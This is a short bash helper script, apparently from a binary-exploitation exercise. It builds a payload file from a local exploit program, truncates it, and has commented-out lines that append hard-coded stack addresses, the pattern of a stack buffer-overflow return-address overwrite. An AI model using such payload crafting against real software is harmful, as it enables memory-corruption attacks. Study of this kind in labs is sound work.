#!/bin/bash

rm payload
./exploit > payload
truncate -s 78 payload
# truncate -s 68 payload
# printf '\x30\xfa\xff\xbf' >> payload
# printf '\x30\xfa\xff\xbf' >> payload
# printf '\x48\xfa\xff\xbf' >> payload
# printf '\x48\xfa\xff\xbf' >> payload
# printf '\x30\xf6\xff\xbf' >> payload
# printf '\x30\xf6\xff\xbf' >> payload
